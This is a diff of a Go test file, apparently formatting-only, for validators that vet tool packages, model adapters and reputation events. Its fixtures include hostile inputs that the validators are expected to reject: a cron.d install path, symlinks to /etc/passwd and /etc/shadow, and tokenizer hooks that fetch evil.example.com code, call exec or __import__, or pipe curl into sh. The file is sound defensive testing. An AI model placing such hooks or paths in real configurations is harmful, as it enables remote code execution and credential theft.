@@ -573,9 +573,9 @@ func TestValidateToolPackage(t *testing.T) {
 			wantErr: false,
 		},
 		{
-			name: "未签名拒绝（A6 签名前置）",
-			pkg:  ToolPackage{Name: "p2", Signature: "  ", Artifact: artifact, ArtifactSHA: artifactSHA},
-			cfg:  ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			name:    "未签名拒绝（A6 签名前置）",
+			pkg:     ToolPackage{Name: "p2", Signature: "  ", Artifact: artifact, ArtifactSHA: artifactSHA},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: true,
 		},
 		{
@@ -583,13 +583,13 @@ func TestValidateToolPackage(t *testing.T) {
 			pkg: ToolPackage{
 				Name: "p3", Signature: "sig", Artifact: artifact, ArtifactSHA: "bad",
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: true,
 		},
 		{
-			name: "无工件时跳过哈希检查",
-			pkg:  ToolPackage{Name: "p4", Signature: "sig"},
-			cfg:  ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			name:    "无工件时跳过哈希检查",
+			pkg:     ToolPackage{Name: "p4", Signature: "sig"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: false,
 		},
 		{
@@ -607,7 +607,7 @@ func TestValidateToolPackage(t *testing.T) {
 			pkg: ToolPackage{
 				Name: "p6", Signature: "sig", InstallPath: "/etc/cron.d/evil",
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: true,
 		},
 		{
@@ -615,7 +615,7 @@ func TestValidateToolPackage(t *testing.T) {
 			pkg: ToolPackage{
 				Name: "p7", Signature: "sig", InstallPath: "/data/sandbox/pkg/bin",
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: false,
 		},
 		{
@@ -623,7 +623,7 @@ func TestValidateToolPackage(t *testing.T) {
 			pkg: ToolPackage{
 				Name: "p8", Signature: "sig", Symlinks: []string{"../../etc/passwd"},
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: true,
 		},
 		{
@@ -631,7 +631,7 @@ func TestValidateToolPackage(t *testing.T) {
 			pkg: ToolPackage{
 				Name: "p9", Signature: "sig", Symlinks: []string{"data/file"},
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: false,
 		},
 		{
@@ -639,7 +639,7 @@ func TestValidateToolPackage(t *testing.T) {
 			pkg: ToolPackage{
 				Name: "p10", Signature: "sig", Symlinks: []string{"/etc/shadow"},
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: true,
 		},
 		{
@@ -648,7 +648,7 @@ func TestValidateToolPackage(t *testing.T) {
 				Name: "p11", Signature: "sig", ClaimedOps: []string{"file.write"},
 				Description: "read only helper",
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: true,
 		},
 		{
@@ -657,7 +657,7 @@ func TestValidateToolPackage(t *testing.T) {
 				Name: "p12", Signature: "sig", ClaimedOps: []string{"file.write"},
 				Description: "this tool will write files to disk",
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: false,
 		},
 		{
@@ -665,7 +665,7 @@ func TestValidateToolPackage(t *testing.T) {
 			pkg: ToolPackage{
 				Name: "p13", Signature: "sig", ClaimedOps: []string{"file.read"},
 			},
-			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
+			cfg:     ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
 			wantErr: false,
 		},
 	}
@@ -783,54 +783,54 @@ func TestValidateModelAdapter(t *testing.T) {
 		{name: "合法适配器通过（许可证大小写不敏感）", mutate: func(a *ModelAdapter) {}, rec: rec, wantErr: false},
 		{name: "无登记记录时跳过对照检查", mutate: func(a *ModelAdapter) {}, rec: nil, wantErr: false},
 		{
-			name: "声明基座与登记不符拒绝",
+			name:   "声明基座与登记不符拒绝",
 			mutate: func(a *ModelAdapter) { a.DeclaredBase = "fp-evil"; a.WeightSHA = "fp-evil" },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "权重指纹与声明基座不符拒绝",
+			name:   "权重指纹与声明基座不符拒绝",
 			mutate: func(a *ModelAdapter) { a.WeightSHA = "fp-other" },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "向量维度不符拒绝",
+			name:   "向量维度不符拒绝",
 			mutate: func(a *ModelAdapter) { a.EmbeddingDim = 1024 },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "缺少溯源证明拒绝",
+			name:   "缺少溯源证明拒绝",
 			mutate: func(a *ModelAdapter) { a.Provenance = nil },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "tokenizer 含 http 远程 py 钩子拒绝",
+			name:   "tokenizer 含 http 远程 py 钩子拒绝",
 			mutate: func(a *ModelAdapter) { a.TokenizerConf = "hook: https://evil.example.com/x.py" },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "tokenizer 含 exec( 钩子拒绝",
+			name:   "tokenizer 含 exec( 钩子拒绝",
 			mutate: func(a *ModelAdapter) { a.TokenizerConf = "hook: exec(payload)" },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "tokenizer 含 __import__ 钩子拒绝",
+			name:   "tokenizer 含 __import__ 钩子拒绝",
 			mutate: func(a *ModelAdapter) { a.TokenizerConf = "hook: __import__('os')" },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "tokenizer 含 curl|sh 钩子拒绝",
+			name:   "tokenizer 含 curl|sh 钩子拒绝",
 			mutate: func(a *ModelAdapter) { a.TokenizerConf = "setup: curl http://x | sh" },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "许可证与登记不符拒绝",
+			name:   "许可证与登记不符拒绝",
 			mutate: func(a *ModelAdapter) { a.LicenseID = "GPL-3.0" },
-			rec: rec, wantErr: true,
+			rec:    rec, wantErr: true,
 		},
 		{
-			name: "合法 URL 配置通过",
+			name:   "合法 URL 配置通过",
 			mutate: func(a *ModelAdapter) { a.TokenizerConf = "doc: https://example.com/spec" },
-			rec: rec, wantErr: false,
+			rec:    rec, wantErr: false,
 		},
 	}
 	for _, tt := range tests {
@@ -965,8 +965,8 @@ func TestReputationGuard_Inflation(t *testing.T) {
 		wantErr bool
 	}{
 		{
-			name: "满分自报无审计拒绝",
-			e:    RepEvent{From: "n1", Kind: RepScore, Success: 1.0, At: base},
+			name:    "满分自报无审计拒绝",
+			e:       RepEvent{From: "n1", Kind: RepScore, Success: 1.0, At: base},
 			wantErr: true,
 		},
 		{
@@ -978,8 +978,8 @@ func TestReputationGuard_Inflation(t *testing.T) {
 			e:    RepEvent{From: "n1", Kind: RepScore, Success: 0.95, At: base},
 		},
 		{
-			name: "满分但审计链为空白拒绝",
-			e:    RepEvent{From: "n1", Kind: RepScore, Success: 1.0, AuditID: "   ", At: base},
+			name:    "满分但审计链为空白拒绝",
+			e:       RepEvent{From: "n1", Kind: RepScore, Success: 1.0, AuditID: "   ", At: base},
 			wantErr: true,
 		},
 	}
